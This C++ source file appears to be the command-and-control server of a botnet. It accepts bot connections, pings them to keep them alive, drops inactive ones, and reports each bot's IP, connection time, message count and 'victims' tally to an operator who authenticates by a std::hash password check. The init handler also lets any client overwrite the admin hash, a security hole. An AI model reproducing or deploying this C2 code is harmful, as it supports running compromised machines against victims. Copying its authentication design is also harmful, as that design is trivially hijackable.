#include "server.h"

#include <string>

#ifdef NDEBUG
#define PRINT(a, b)
#else
#define PRINT(a, b) std::cout << "[DEBUG]: " << (a) << (b) << std::endl;
#endif

server::server(io::io_context& io_context, std::uint16_t port)
    : io_context_(io_context),
      acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
      interval_(INACTIVITY_TIMEOUT),
      timer_(io_context_, interval_) {
	command_handlers_ = {
	    {"[ARE_YOU_ALIVE]",
	     boost::bind(&server::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[INIT]",
	     boost::bind(&server::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	    {"[GET_BOTS_DATA]", boost::bind(&server::getClientsData, this, boost::placeholders::_1, boost::placeholders::_2,
					    boost::placeholders::_3)},
	    {"[DEL_BOT]",
	     boost::bind(&server::removeClient, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
	};
}

void server::start() {
	timer_.async_wait(boost::bind(&server::pingClients, this));
	accept();
}

void server::accept() {
	socket_.emplace(io_context_);
	acceptor_.async_accept(*socket_, [self = this](err error_code) { self->onAccept(error_code); });
}

void server::onAccept(err error_code) {
	size_t client_id = getClientId_();
	clients_sessions_container_.insert(
	    std::make_pair(client_id, std::unique_ptr<session>(new session(std::move(*socket_), io_context_, client_id))));
	auto& client = clients_sessions_container_.find(client_id)->second;

	PRINT("New client connected", "");

	client->start(boost::bind(&server::handleResponse, this, boost::placeholders::_1, boost::placeholders::_2));
	accept();
}

void server::handleResponse(std::string& query, session* client) {
	PRINT(client->endpoint_, (": " + query));

	auto parsed_msg = msg_parser_.parse_msg(query);

	if (parsed_msg["is_valid_msg"][0] == "false") {
		PRINT("Invalid message", "");
		return;
	}
	if (command_handlers_.find(parsed_msg["command"][0]) == command_handlers_.end()) {
		PRINT("No handler for ", parsed_msg["command"][0]);
		return;
	};
	updateMsgCounter_(client);
	auto handler = command_handlers_.find(parsed_msg["command"][0])->second;
	if (handler) handler(parsed_msg["command"][0], parsed_msg["params"], client);
}

void server::handleAlive(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!isNumber_(params[0])) return;
	if (stoi(params[0])) client->inactive_timeout_count_ = 0;
}

void server::handleInit(std::string& command, std::vector<std::string>& params, session* client) {
	if (params.size()) {
		if (!checkHash_(params[0])) {
			std::hash<std::string> hasher;
			admin_hash_ = hasher(params[0]);
			PRINT(command, " was successfull!");
		}
	}

	if (clients_data_container_.find(client->ip_) != clients_data_container_.end()) {
		clients_data_container_[client->ip_].id = clients_sessions_container_.find(client->id_)->first;
		clients_data_container_[client->ip_].connected = getCurrentDateTime_();
	}

	std::vector<std::string> output_params = {"1"};
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::getClientsData(std::string& command, std::vector<std::string>& params, session* client) {
	if (!params.size()) return;
	if (!checkHash_(params[0])) return;

	std::vector<std::string> output_params = {"5", "[IP-address]", "[Connected]", "[Messages]", "[Victims]", "[Ping]"};
	std::unique_lock<std::mutex> lock(clients_data_m_);

	for (auto& bot : clients_data_container_) {
		output_params.push_back(bot.first);
		output_params.push_back(bot.second.connected);
		output_params.push_back(std::to_string(bot.second.msgs_from));
		output_params.push_back(std::to_string(bot.second.victims));
		output_params.push_back(std::to_string(bot.second.ping));
	}
	client->send(msg_parser_.genCommand(command, output_params));
}

void server::removeClient(std::string& command, std::vector<std::string>& params, session* client) {
	// if (params.size() < 2) return;
	// if (!checkHash_(params[0])) return;
	// std::unique_ptr<session> bot;
	// size_t bot_id;
	// {
	// 	std::unique_lock<std::mutex> lock(clients_m_);
	// 	for (auto const& [key, val] : clients_sessions_container_) {
	// 		std::stringstream ip;
	// 		ip << val->endpoint_;
	// 		if (params[1] == ip.str()) {
	// 			bot_id = key;
	// 			bot = val;
	// 			break;
	// 		}
	// 	}
	// }
	// bot->stop();
	// {
	// 	std::unique_lock<std::mutex> lock(clients_m_);
	// 	clients_sessions_container_.erase(bot_id);
	// }
}

void server::pingClients() {
	std::string command = "[ARE_YOU_ALIVE]";
	std::vector<std::pair<size_t, std::string>> inactive_clients;

	for (auto& client : clients_sessions_container_) {
		++client.second->inactive_timeout_count_;
		if (client.second->inactive_timeout_count_ >= INACTIVE_COUNTER_MAX) {
			PRINT("Disconnecting due to inactivity client:", client.second->ip_);
			inactive_clients.push_back(std::make_pair(client.second->id_, client.second->ip_));
		} else {
			if (clients_data_container_.find(client.second->ip_) == clients_data_container_.end()) {
				continue;
			}
			std::vector<std::string> output_params = {NONE_PARAMETERS};
			client.second->send(msg_parser_.genCommand(command, output_params));
		}
	}

	for (auto& client : inactive_clients) {
		{
			std::unique_lock<std::mutex> lock(clients_session_m_);
			clients_sessions_container_.erase(client.first);
		}
		{
			std::unique_lock<std::mutex> lock(clients_data_m_);
			if (clients_data_container_.find(client.second) != clients_data_container_.end()) {
				clients_data_container_.erase(client.second);
			}
		}
	}
	timer_.expires_at(timer_.expires_at() + interval_);
	timer_.async_wait(boost::bind(&server::pingClients, this));
}

size_t server::getClientId_() {
	std::hash<long int> hasher;
	size_t id = hasher(
	    std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count());
	return id;
}

bool server::checkHash_(std::string& pass) {
	if (pass == "") return false;
	std::hash<std::string> hasher;
	return hasher(pass) == admin_hash_;
}

const std::string server::getCurrentDateTime_() {
	time_t now = time(0);
	struct tm tstruct;
	char buf[80];
	tstruct = *localtime(&now);
	strftime(buf, sizeof(buf), "%Y-%m-%d.%X", &tstruct);
	return buf;
}

void server::updateMsgCounter_(session* client) {
	std::unique_lock<std::mutex> lock(clients_data_m_);
	++clients_data_container_[client->ip_].msgs_from;
}

bool server::isNumber_(const std::string& s) { return !s.empty() && std::all_of(s.begin(), s.end(), ::isdigit); }
